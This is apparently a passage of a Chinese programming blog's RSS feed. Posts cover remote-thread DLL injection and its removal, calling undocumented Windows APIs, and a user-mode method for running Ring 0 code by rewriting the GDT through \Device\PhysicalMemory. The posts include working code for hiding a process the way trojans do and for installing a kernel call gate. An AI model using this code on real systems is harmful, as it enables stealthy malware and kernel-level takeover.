src="http://www.titilima.cn/pics/remote2.gif"&gt; &lt;p&gt;在调用了注入代码之后，DLL.dll就位于Target.exe的模块列表之中了： &lt;p&gt;&lt;img src="http://www.titilima.cn/pics/remote3.gif"&gt; &lt;p&gt;&lt;b&gt;矛盾相生&lt;/b&gt; &lt;p&gt;记得2004年初我将QQ尾巴病毒成功仿真后，有很多网友询问我如何才能杀毒，不过我都没有回答——因为当时我研究的重点并非病毒的寄生特性。这一寄生特性直到今天可以说我才仿真完毕，那么，我就将解毒的方法也一并公开吧。 &lt;p&gt;和DLL的注入过程类似，只不过在这里使用了两个API：GetModuleHandle和FreeLibrary。出于篇幅考虑，我略去了与注入部分相似或相同的代码： &lt;p&gt;&lt;code&gt;// 使目标进程调用GetModuleHandle，获得DLL在目标进程中的句柄&lt;br&gt;DWORD dwHandle, dwID;&lt;br&gt;LPVOID pFunc = GetModuleHandleA;&lt;br&gt;HANDLE hThread = CreateRemoteThread( hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunc, lpBuf, 0, &amp;amp;dwID );&lt;br&gt;// 等待GetModuleHandle运行完毕&lt;br&gt;WaitForSingleObject( hThread, INFINITE );&lt;br&gt;// 获得GetModuleHandle的返回值&lt;br&gt;GetExitCodeThread( hThread, &amp;amp;dwHandle );&lt;br&gt;// 释放目标进程中申请的空间&lt;br&gt;VirtualFreeEx( hProcess, lpBuf, dwSize, MEM_DECOMMIT );&lt;br&gt;CloseHandle( hThread );&lt;br&gt;// 使目标进程调用FreeLibrary，卸载DLL&lt;br&gt;pFunc = FreeLibrary;&lt;br&gt;hThread = CreateRemoteThread( hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFunc, (LPVOID)dwHandle, 0, &amp;amp;dwID );&lt;br&gt;// 等待FreeLibrary卸载完毕&lt;br&gt;WaitForSingleObject( hThread, INFINITE );&lt;br&gt;CloseHandle( hThread );&lt;br&gt;CloseHandle( hProcess );&lt;/code&gt; &lt;p&gt;用这个方法可以卸载一个进程中的DLL模块，当然包括那些非病毒体的DLL。所以，这段代码还是谨慎使用为好。 &lt;p&gt;在完成卸载之后，如果没有别的程序加载这个DLL，你就可以将它删除了。 &lt;p&gt;到此为止，整个的技术细节我就讲完了。&lt;/p&gt;</description></item><item><title>如何调用未公开的API函数[转]</title><link>https://blogs.qipai360.cn/post/how-to-call-undocumented-api-functions/</link><pubDate>Wed, 07 Nov 2007 10:46:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/how-to-call-undocumented-api-functions/</guid><description>&lt;p&gt;&lt;/p&gt; &lt;p&gt;Windows SDK开发包中并未提供所有的API函数，在本文中我将讨论如何调用这种未公开的API函数。 &lt;p&gt;事实上所有未公开的API函数都和其它的API函数一样包含在系统的动态链接库中，调用这些函数的方法是取得它们的指针，然后通过指针来进行操作。而取得函数地址，是通过GetProcAddress这个API函数实现的： &lt;p&gt;&lt;code&gt;FARPROC WINAPI GetProcAddress(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; HMODULE hModule, // DLL模块句柄&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; LPCSTR lpProcName // 函数名称&lt;br&gt;);&lt;/code&gt; &lt;p&gt;当然，在取得地址之前，需要用LoadLibrary获得模块的句柄。还有，为了书写方便，最好用typedef将函数指针定义为一种类型。 &lt;p&gt;下面我将通过两个例子来演示如何调用这些未公开的API函数。 &lt;p&gt;一、有名称的函数 &lt;p&gt;这种函数在DLL中拥有自己的函数名称，但是在SDK包中并没有提供声明，其中最有代表性的是RegisterServiceProcess函数： &lt;p&gt;&lt;code&gt;DWORD WINAPI RegisterServiceProcess(&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DWORD dwProcessId, // 进程ID&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; DWORD dwType // 注册种类，1表示注册&lt;br&gt;);&lt;/code&gt; &lt;p&gt;这个函数的功能是在Win98下将进程注册为系统服务进程，很多木马程序的隐藏就是用这个函数实现的。调用它的示例代码如下： &lt;p&gt;&lt;code&gt;typedef DWORD (WINAPI * REGISTER)( DWORD, DWORD );&lt;br&gt;HMODULE hModule;&lt;br&gt;REGISTER RegisterServiceProcess;&lt;br&gt;hModule = LoadLibrary( "kernel32.dll" );&lt;br&gt;if ( hModule != NULL )&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; RegisterServiceProcess = (REGISTER)GetProcAddress( hModule, "RegisterServiceProcess" );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; RegisterServiceProcess( GetCurrentProcessId(), 1 );&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; FreeLibrary( hModule );&lt;br&gt;}&lt;/code&gt; &lt;p&gt;二、无名称的函数 &lt;p&gt;有的函数在DLL中并没有函数名称，这又如何调用呢？事实上所有的API函数无论有无名称，都会有一个ID，来在DLL中标识自己。比如函数RunFileDlg，它的ID是61，功能是显示系统“运行”对话框。下图所列的是我开发的进程管理软件July中所调用的“运行”对话框： &lt;p&gt;&lt;img src="http://www.titilima.cn/pics/api.gif"&gt; &lt;p&gt;事实上调用这种函数的方法和前一种非常相似，唯一不同的只是把GetProcAddress的lpProcName参数使用MAKEINTRESOURCE宏将函数的ID转换一下即可。示例代码如下： &lt;p&gt;&lt;code&gt;typedef void (WINAPI* RUN)( HWND, HICON, LPCSTR, LPCSTR, LPCSTR, UINT );&lt;br&gt;HMODULE hShell32;&lt;br&gt;RUN RunFileDlg;&lt;br&gt;hShell32 = LoadLibrary( "shell32.dll" );&lt;br&gt;RunFileDlg = (RUN)GetProcAddress( hShell32, MAKEINTRESOURCE( 61 ) );&lt;br&gt;RunFileDlg( hParent, hIcon, NULL, NULL, NULL, 0 );&lt;br&gt;FreeLibrary( hShell32 );&lt;/code&gt; &lt;p&gt;未公开的API函数的调用方法就介绍到这里了。事实上还有很多这样的函数，关于这些函数的介绍及使用方法，请&lt;a href="http://www.titilima.cn/download/api.zip"&gt;下载我的“未公开的Windows API函数”文档&lt;/a&gt;。&lt;/p&gt;</description></item><item><title>Windows NT/2000/XP下不用驱动的Ring0代码实现</title><link>https://blogs.qipai360.cn/post/windows-nt-2000-xp-ring0-implementation-without-driver/</link><pubDate>Fri, 21 Sep 2007 09:38:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/windows-nt-2000-xp-ring0-implementation-without-driver/</guid><description>&lt;p&gt;大家知道，Windows NT/2000为实现其可靠性，严格将系统划分为内核模式与用户模式，在i386系统中分别对应CPU的Ring0与Ring3级别。Ring0下，可以执行特权级指令，对任何I/O设备都有访问权等等。要实现从用户态进入核心态，即从Ring 3进入Ring 0必须借助CPU的某种门机制，如中断门、调用门等。而Windows NT/2000提供用户态执行系统服务(Ring 0例程)的此类机制即System Service的int 2eh中断服务等，严格的参数检查，只能严格的执行Windows NT/2000提供的服务，而如果想执行用户提供的Ring 0代码(指运行在Ring 0权限的代码)，常规方法似乎只有编写设备驱动程序。本文将介绍一种在用户态不借助任何驱动程序执行Ring0代码的方法。&lt;BR&gt;&lt;BR&gt;    Windows NT/2000将设备驱动程序调入内核区域(常见的位于地址0x80000000上)，由DPL为0的GDT项8，即cs为8时实现Ring 0权限。本文通过在系统中构造一个指向我们的代码的调用门(CallGate)，实现Ring0代码。基于这个思路，为实现这个目的主要是构造自己的CallGate。CallGate由系统中叫Global Descriptor Table(GDT)的全局表指定。GDT地址可由i386指令sgdt获得(sgdt不是特权级指令，普通Ring 3程序均可执行)。GDT地址在Windows NT/2000保存于KPCR(Processor Control Region)结构中(见《再谈Windows NT/2000环境切换》)。GDT中的CallGate是如下的格式：&lt;BR&gt;&lt;BR&gt;    typedef struct&lt;BR&gt;    {&lt;BR&gt;        unsigned short  offset_0_15;&lt;BR&gt;        unsigned short  selector;&lt;BR&gt;&lt;BR&gt;        unsigned char    param_count : 4;&lt;BR&gt;        unsigned char    some_bits   : 4;&lt;BR&gt;&lt;BR&gt;        unsigned char    type        : 4;&lt;BR&gt;        unsigned char    app_system  : 1;&lt;BR&gt;        unsigned char    dpl         : 2;&lt;BR&gt;        unsigned char    present     : 1;&lt;BR&gt;    &lt;BR&gt;        unsigned short  offset_16_31;&lt;BR&gt;    } CALLGATE_DESCRIPTOR;&lt;BR&gt;&lt;BR&gt;    GDT位于内核区域，一般用户态的程序是不可能对这段内存区域有直接的访问权。幸运的是Windows NT/2000提供了一个叫PhysicalMemory的Section内核对象位于\Device的路径下。顾名思义，通过这个Section对象可以对物理内存进行操作。用objdir.exe对这个对象分析如下：&lt;BR&gt;&lt;BR&gt;    C:\NTDDK\bin&amp;gt;objdir /D \Device&lt;BR&gt;&lt;BR&gt;    PhysicalMemory                   &lt;BR&gt;        Section&lt;BR&gt;        DACL - &lt;BR&gt;           Ace[ 0] - Grant - 0xf001f - NT AUTHORITY\SYSTEM&lt;BR&gt;                             Inherit: &lt;BR&gt;                             Access: 0x001F  and  ( D RCtl WOwn WDacl )&lt;BR&gt;&lt;BR&gt;           Ace[ 1] - Grant - 0x2000d - BUILTIN\Administrators&lt;BR&gt;                             Inherit: &lt;BR&gt;                             Access: 0x000D  and  ( RCtl )&lt;BR&gt;&lt;BR&gt;    从dump出的这个对象DACL的Ace可以看出默认情况下只有SYSTEM用户才有对这个对象的读写权限，即对物理内存有读写能力，而Administrator只有读权限，普通用户根本就没有权限。不过如果我们有Administrator权限就可以通过GetSecurityInfo、SetEntriesInAcl与SetSecurityInfo这些API来修改这个对象的ACE。这也是我提供的代码需要Administrator的原因。实现的代码如下：&lt;BR&gt;&lt;BR&gt;    VOID SetPhyscialMemorySectionCanBeWrited(HANDLE hSection)&lt;BR&gt;    {&lt;BR&gt;&lt;BR&gt;       PACL pDacl=NULL;&lt;BR&gt;       PACL pNewDacl=NULL;&lt;BR&gt;       PSECURITY_DESCRIPTOR pSD=NULL;&lt;BR&gt;       DWORD dwRes;&lt;BR&gt;       EXPLICIT_ACCESS ea;&lt;BR&gt;&lt;BR&gt;       if(dwRes=GetSecurityInfo(hSection,SE_KERNEL_OBJECT,DACL_SECURITY_INFORMATION,&lt;BR&gt;                  NULL,NULL,&amp;amp;pDacl,NULL,&amp;amp;pSD)!=ERROR_SUCCESS)&lt;BR&gt;          {&lt;BR&gt;             printf( &amp;ldquo;GetSecurityInfo Error %u\n&amp;rdquo;, dwRes );&lt;BR&gt;             goto CleanUp;&lt;BR&gt;          }&lt;BR&gt;&lt;BR&gt;       ZeroMemory(&amp;amp;ea, sizeof(EXPLICIT_ACCESS));&lt;BR&gt;       ea.grfAccessPermissions = SECTION_MAP_WRITE;&lt;BR&gt;       ea.grfAccessMode = GRANT_ACCESS;&lt;BR&gt;       ea.grfInheritance= NO_INHERITANCE;&lt;BR&gt;       ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;&lt;BR&gt;       ea.Trustee.TrusteeType = TRUSTEE_IS_USER;&lt;BR&gt;       ea.Trustee.ptstrName = &amp;ldquo;CURRENT_USER&amp;rdquo;;&lt;BR&gt;&lt;BR&gt;&lt;BR&gt;       if(dwRes=SetEntriesInAcl(1,&amp;amp;ea,pDacl,&amp;amp;pNewDacl)!=ERROR_SUCCESS)&lt;BR&gt;          {&lt;BR&gt;             printf( &amp;ldquo;SetEntriesInAcl %u\n&amp;rdquo;, dwRes );&lt;BR&gt;             goto CleanUp;&lt;BR&gt;          }&lt;BR&gt;&lt;BR&gt;       if(dwRes=SetSecurityInfo(hSection,SE_KERNEL_OBJECT,DACL_SECURITY_INFORMATION,NULL,NULL,pNewDacl,NULL)!=ERROR_SUCCESS)&lt;BR&gt;          {&lt;BR&gt;             printf(&amp;ldquo;SetSecurityInfo %u\n&amp;rdquo;,dwRes);&lt;BR&gt;             goto CleanUp;&lt;BR&gt;          }&lt;BR&gt;&lt;BR&gt;    CleanUp:&lt;BR&gt;&lt;BR&gt;       if(pSD)&lt;BR&gt;          LocalFree(pSD);&lt;BR&gt;       if(pNewDacl)&lt;BR&gt;          LocalFree(pSD);&lt;BR&gt;    }&lt;BR&gt;&lt;BR&gt;    这段代码对给定HANDLE的对象增加了如下的ACE: &lt;BR&gt;&lt;BR&gt;    PhysicalMemory                   &lt;BR&gt;        Section&lt;BR&gt;        DACL - &lt;BR&gt;           Ace[ 0] - Grant - 0x2 - WEBCRAZY\Administrator&lt;BR&gt;                             Inherit: &lt;BR&gt;                             Access: 0x0002    //SECTION_MAP_WRITE&lt;BR&gt;&lt;BR&gt;    这样我们在有Administrator权限的条件下就有了对物理内存的读写能力。但若要修改GDT表实现Ring 0代码。我们将面临着另一个难题，因为sgdt指令获得的GDT地址是虚拟地址(线性地址)，我们只有知道GDT表的物理地址后才能通过\Device\PhysicalMemory对象修改GDT表，这就牵涉到了线性地址转化成物理地址的问题。我们先来看一看Windows NT/2000是如何实现这个的：&lt;BR&gt;&lt;BR&gt;    kd&amp;gt; u nt!MmGetPhysicalAddress l 30&lt;BR&gt;    ntoskrnl!MmGetPhysicalAddress:&lt;BR&gt;    801374e0 56               push    esi&lt;BR&gt;    801374e1 8b742408         mov     esi,[esp+0x8]&lt;BR&gt;    801374e5 33d2             xor     edx,edx&lt;BR&gt;    801374e7 81fe00000080     cmp     esi,0x80000000&lt;BR&gt;    801374ed 722c             jb    ntoskrnl!MmGetPhysicalAddress+0x2b (8013751b)&lt;BR&gt;    801374ef 81fe000000a0     cmp     esi,0xa0000000&lt;BR&gt;    801374f5 7324             jnb   ntoskrnl!MmGetPhysicalAddress+0x2b (8013751b)&lt;BR&gt;    801374f7 39153ce71780     cmp     [ntoskrnl!MmKseg2Frame (8017e73c)],edx&lt;BR&gt;    801374fd 741c             jz    ntoskrnl!MmGetPhysicalAddress+0x2b (8013751b)&lt;BR&gt;    801374ff 8bc6             mov     eax,esi&lt;BR&gt;    80137501 c1e80c           shr     eax,0xc&lt;BR&gt;    80137504 25ffff0100       and     eax,0x1ffff&lt;BR&gt;    80137509 6a0c             push    0xc&lt;BR&gt;    8013750b 59               pop     ecx&lt;BR&gt;    8013750c e8d3a7fcff       call    ntoskrnl!_allshl (80101ce4)&lt;BR&gt;    80137511 81e6ff0f0000     and     esi,0xfff&lt;BR&gt;    80137517 03c6             add     eax,esi&lt;BR&gt;    80137519 eb17             jmp   ntoskrnl!MmGetPhysicalAddress+0x57 (80137532)&lt;BR&gt;    8013751b 8bc6             mov     eax,esi&lt;BR&gt;    8013751d c1e80a           shr     eax,0xa&lt;BR&gt;    80137520 25fcff3f00       and     eax,0x3ffffc&lt;BR&gt;    80137525 2d00000040       sub     eax,0x40000000&lt;BR&gt;    8013752a 8b00             mov     eax,[eax]&lt;BR&gt;    8013752c a801             test    al,0x1&lt;BR&gt;    8013752e 7506             jnz   ntoskrnl!MmGetPhysicalAddress+0x44 (80137536)&lt;BR&gt;    80137530 33c0             xor     eax,eax&lt;BR&gt;    80137532 5e               pop     esi&lt;BR&gt;    80137533 c20400           ret     0x4&lt;BR&gt;&lt;BR&gt;    从这段汇编代码可看出如果线性地址在0x80000000与0xa0000000范围内，只是简单的进行移位操作(位于801374ff-80137519指令间)，并未查页表。我想Microsoft这样安排肯定是出于执行效率的考虑。这也为我们指明了一线曙光，因为GDT表在Windows NT/2000中一般情况下均位于这个区域(我不知道/3GB开关的Windows NT/2000是不是这种情况)。&lt;BR&gt;&lt;BR&gt;    经过这样的分析，我们就可以只通过用户态程序修改GDT表了。而增加一个CallGate就不是我可以介绍的了，找本Intel手册自己看一看了。具体实现代码如下：&lt;BR&gt;&lt;BR&gt;    typedef struct gdtr {&lt;BR&gt;        short Limit;&lt;BR&gt;        short BaseLow;&lt;BR&gt;        short BaseHigh;&lt;BR&gt;    } Gdtr_t, &lt;em&gt;PGdtr_t;&lt;BR&gt;&lt;BR&gt;    ULONG MiniMmGetPhysicalAddress(ULONG virtualaddress)&lt;BR&gt;    {&lt;BR&gt;        if(virtualaddress&amp;lt;0x80000000||virtualaddress&amp;gt;=0xA0000000)&lt;BR&gt;           return 0;&lt;BR&gt;        return virtualaddress&amp;amp;0x1FFFF000;&lt;BR&gt;    }&lt;BR&gt;&lt;BR&gt;    BOOL ExecRing0Proc(ULONG Entry,ULONG seglen)&lt;BR&gt;    {&lt;BR&gt;       Gdtr_t gdt;&lt;BR&gt;       __asm sgdt gdt;&lt;BR&gt;     &lt;BR&gt;       ULONG mapAddr=MiniMmGetPhysicalAddress(gdt.BaseHigh&amp;lt;&amp;lt;16U|gdt.BaseLow);&lt;BR&gt;       if(!mapAddr) return 0;&lt;BR&gt;&lt;BR&gt;       HANDLE   hSection=NULL;&lt;BR&gt;       NTSTATUS status;&lt;BR&gt;       OBJECT_ATTRIBUTES        objectAttributes;&lt;BR&gt;       UNICODE_STRING objName;&lt;BR&gt;       CALLGATE_DESCRIPTOR &lt;em&gt;cg;&lt;BR&gt;&lt;BR&gt;       status = STATUS_SUCCESS;&lt;BR&gt;   &lt;BR&gt;       RtlInitUnicodeString(&amp;amp;objName,L&amp;quot;\Device\PhysicalMemory&amp;quot;);&lt;BR&gt;&lt;BR&gt;       InitializeObjectAttributes(&amp;amp;objectAttributes,&lt;BR&gt;                                  &amp;amp;objName,&lt;BR&gt;                                  OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,&lt;BR&gt;                                  NULL,&lt;BR&gt;                                 (PSECURITY_DESCRIPTOR) NULL);&lt;BR&gt;&lt;BR&gt;       status = ZwOpenSection(&amp;amp;hSection,SECTION_MAP_READ|SECTION_MAP_WRITE,&amp;amp;objectAttributes);&lt;BR&gt;&lt;BR&gt;       if(status == STATUS_ACCESS_DENIED){&lt;BR&gt;          status = ZwOpenSection(&amp;amp;hSection,READ_CONTROL|WRITE_DAC,&amp;amp;objectAttributes);&lt;BR&gt;          SetPhyscialMemorySectionCanBeWrited(hSection);&lt;BR&gt;          ZwClose(hSection);&lt;BR&gt;          status =ZwOpenSection(&amp;amp;hSection,SECTION_MAP_WRITE|SECTION_MAP_WRITE,&amp;amp;objectAttributes);&lt;BR&gt;       }&lt;BR&gt;&lt;BR&gt;       if(status != STATUS_SUCCESS)&lt;BR&gt;         {&lt;BR&gt;            printf(&amp;ldquo;Error Open PhysicalMemory Section Object,Status:%08X\n&amp;rdquo;,status);&lt;BR&gt;            return 0;&lt;BR&gt;         }&lt;BR&gt;      &lt;BR&gt;       PVOID BaseAddress;&lt;BR&gt;&lt;BR&gt;       BaseAddress=MapViewOfFile(hSection,&lt;BR&gt;                     FILE_MAP_READ|FILE_MAP_WRITE,&lt;BR&gt;                     0,&lt;BR&gt;                     mapAddr,    //low part&lt;BR&gt;                     (gdt.Limit+1));&lt;BR&gt;&lt;BR&gt;       if(!BaseAddress)&lt;BR&gt;          {&lt;BR&gt;             printf(&amp;ldquo;Error MapViewOfFile:&amp;rdquo;);&lt;BR&gt;             PrintWin32Error(GetLastError());&lt;BR&gt;             return 0;&lt;BR&gt;          }&lt;BR&gt;&lt;BR&gt;       BOOL setcg=FALSE;&lt;BR&gt;&lt;BR&gt;       for(cg=(CALLGATE_DESCRIPTOR &lt;/em&gt;)((ULONG)BaseAddress+(gdt.Limit&amp;amp;0xFFF8));(ULONG)cg&amp;gt;(ULONG)BaseAddress;cg&amp;ndash;)&lt;BR&gt;           if(cg-&amp;gt;type == 0){&lt;BR&gt;             cg-&amp;gt;offset_0_15 = LOWORD(Entry);&lt;BR&gt;             cg-&amp;gt;selector = 8;&lt;BR&gt;             cg-&amp;gt;param_count = 0;&lt;BR&gt;             cg-&amp;gt;some_bits = 0;&lt;BR&gt;             cg-&amp;gt;type = 0xC;          // 386 call gate&lt;BR&gt;             cg-&amp;gt;app_system = 0;      // A system descriptor&lt;BR&gt;             cg-&amp;gt;dpl = 3;             // Ring 3 code can call&lt;BR&gt;             cg-&amp;gt;present = 1;&lt;BR&gt;             cg-&amp;gt;offset_16_31 = HIWORD(Entry);&lt;BR&gt;             setcg=TRUE;&lt;BR&gt;             break;&lt;BR&gt;          }&lt;BR&gt;&lt;BR&gt;       if(!setcg){&lt;BR&gt;            ZwClose(hSection);&lt;BR&gt;            return 0;&lt;BR&gt;       }&lt;BR&gt;&lt;BR&gt;       short farcall[3];&lt;BR&gt;&lt;BR&gt;       farcall[2]=((short)((ULONG)cg-(ULONG)BaseAddress))|3;  //Ring 3 callgate;&lt;BR&gt;&lt;BR&gt;       if(!VirtualLock((PVOID)Entry,seglen))&lt;BR&gt;          {&lt;BR&gt;             printf(&amp;ldquo;Error VirtualLock:&amp;rdquo;);&lt;BR&gt;             PrintWin32Error(GetLastError());&lt;BR&gt;             return 0;&lt;BR&gt;          }&lt;BR&gt;&lt;BR&gt;       SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);&lt;BR&gt;&lt;BR&gt;       Sleep(0);&lt;BR&gt;&lt;BR&gt;       _asm call fword ptr [farcall]&lt;BR&gt;&lt;BR&gt;       SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_NORMAL);&lt;BR&gt;&lt;BR&gt;       VirtualUnlock((PVOID)Entry,seglen);&lt;BR&gt;&lt;BR&gt;       //Clear callgate&lt;BR&gt;       &lt;/em&gt;(ULONG &lt;em&gt;)cg=0;&lt;BR&gt;       &lt;/em&gt;((ULONG *)cg+1)=0;&lt;BR&gt;&lt;BR&gt;       ZwClose(hSection);&lt;BR&gt;       return TRUE;&lt;BR&gt;&lt;BR&gt;    }&lt;BR&gt;&lt;BR&gt;    我在提供的代码中演示了对Control Register与I/O端口的操作。CIH病毒在Windows 9X中就是因为获得Ring 0权限才有了一定的危害，但Windows NT/2000毕竟不是Windows 9X，她已经有了比较多的安全审核机制，本文提供的代码也要求具有Administrator权限，但如果系统存在某种漏洞，如缓冲区溢出等等，还是有可能获得这种权限的，所以我不对本文提供的方法负有任何的责任，所有讨论只是一个技术热爱者在讨论技术而已。谢谢！ &lt;BR&gt;&lt;BR&gt;    参考资料：&lt;BR&gt;      1.Intel Corp&amp;lt;&amp;lt;Intel Architecture Software Developer&amp;rsquo;s Manual,Volume 3&amp;gt;&amp;gt;  &lt;BR&gt;&lt;BR&gt;&lt;BR&gt;代码下载:http://www.cnblogs.com/Files/flying_bat/ntring0.zip&lt;/p&gt;</description></item><item><title>防止注入的代码</title><link>https://blogs.qipai360.cn/post/code-injection-prevention/</link><pubDate>Tue, 18 Sep 2007 16:37:00 +0800</pubDate><guid>https://blogs.qipai360.cn/post/code-injection-prevention/</guid><description>&lt;p&gt;闲话不说了，看代码：&lt;BR&gt;&lt;/p&gt;
&lt;DIV style="BORDER-RIGHT: #cccccc 1px solid; PADDING-RIGHT: 5px; BORDER-TOP: #cccccc 1px solid; PADDING-LEFT: 4px; FONT-SIZE: 13px; PADDING-BOTTOM: 4px; BORDER-LEFT: #cccccc 1px solid; WIDTH: 98%; WORD-BREAK: break-all; PADDING-TOP: 4px; BORDER-BOTTOM: #cccccc 1px solid; BACKGROUND-COLOR: #eeeeee"&gt;&lt;SPAN style="COLOR: #008080"&gt;&amp;nbsp;1&lt;/SPAN&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/None.gif" align=top&gt;&lt;SPAN style="COLOR: #0000ff"&gt;#define&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;PROTECTED_DACL_SECURITY_INFORMATION&amp;nbsp;(0x80000000L)&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;&amp;nbsp;2&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/None.gif" align=top&gt;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;&amp;nbsp;3&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/None.gif" align=top&gt;BOOL&amp;nbsp;Lock_CurrentProcess()&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;&amp;nbsp;4&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG id=Codehighlighter1_86_1446_Open_Image onclick="this.style.display='none'; Codehighlighter1_86_1446_Open_Text.style.display='none'; Codehighlighter1_86_1446_Closed_Image.style.display='inline'; Codehighlighter1_86_1446_Closed_Text.style.display='inline';" src="https://blogs.qipai360.cn/Images/OutliningIndicators/ExpandedBlockStart.gif" align=top&gt;&lt;IMG id=Codehighlighter1_86_1446_Closed_Image style="DISPLAY: none" onclick="this.style.display='none'; Codehighlighter1_86_1446_Closed_Text.style.display='none'; Codehighlighter1_86_1446_Open_Image.style.display='inline'; Codehighlighter1_86_1446_Open_Text.style.display='inline';" src="https://blogs.qipai360.cn/Images/OutliningIndicators/ContractedBlock.gif" align=top&gt;&lt;/SPAN&gt;&lt;SPAN id=Codehighlighter1_86_1446_Closed_Text style="BORDER-RIGHT: #808080 1px solid; BORDER-TOP: #808080 1px solid; DISPLAY: none; BORDER-LEFT: #808080 1px solid; BORDER-BOTTOM: #808080 1px solid; BACKGROUND-COLOR: #ffffff"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/dot.gif"&gt;&lt;/SPAN&gt;&lt;SPAN id=Codehighlighter1_86_1446_Open_Text&gt;&lt;SPAN style="COLOR: #000000"&gt;{&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;&amp;nbsp;5&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;HANDLE&amp;nbsp;hProcess&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;::GetCurrentProcess();&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;&amp;nbsp;6&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;SID_IDENTIFIER_AUTHORITY&amp;nbsp;sia&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;SECURITY_WORLD_SID_AUTHORITY;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;&amp;nbsp;7&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;PSID&amp;nbsp;pSid;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;&amp;nbsp;8&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;BOOL&amp;nbsp;bSus&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;FALSE;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;&amp;nbsp;9&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;bSus&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;=&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;::AllocateAndInitializeSid(&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;amp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;sia,&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;1&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;amp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;pSid);&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;10&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" align=top&gt;&amp;nbsp;&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;if&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;(&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;!&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;bSus)&amp;nbsp;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #0000ff"&gt;goto&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&amp;nbsp;Cleanup;&lt;BR&gt;&lt;/SPAN&gt;&lt;SPAN style="COLOR: #008080"&gt;11&lt;/SPAN&gt;&lt;SPAN style="COLOR: #000000"&gt;&lt;IMG src="https://blogs.qipai360.cn/Images/OutliningIndicators/InBlock.gif" 